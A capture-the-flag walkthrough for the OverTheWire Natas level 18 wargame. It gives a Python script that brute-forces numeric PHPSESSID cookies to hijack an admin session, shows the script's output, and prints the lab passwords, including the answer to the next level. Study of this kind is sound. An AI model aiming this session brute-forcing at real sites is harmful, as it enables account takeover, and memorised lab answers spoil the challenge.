# Natas18

## Level Description
- **Username**: natas18
- **Password**: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
- **URL**: http://natas18.natas.labs.overthewire.org

## Method of Solving
![image-1](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas18/image-1.png)

Here is the PHP code for this challenge:

![image-2](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas18/image-2.png)

This application uses only integers in its session ID creation, and the valid session ID numbers only ranges from 1 to 640, which makes valid session IDs vulnerable to brute-force a valid session ID in a few different ways. Here's the Python script:
```bash
#!/bin/python3

import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ") #Replace with target creds

for session_id in range(1, 641):
	cookies = {"PHPSESSID":str(session_id)}
	response = requests.get(url, auth=auth, cookies=cookies)
	
	if "You are an admin" in response.text:
		print(f"Admin session found! PHPSESSID={session_id}")
		print(response.text)
		break
		
		
```
Here is the result:
```bash
┌──(dungcngo㉿kali)-[~/…/walkthroughs/overthewire/natas/natas18]
└─$ python3 natas18_brute_force.py  
Admin session found! PHPSESSID=119
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

***You are welcome!***
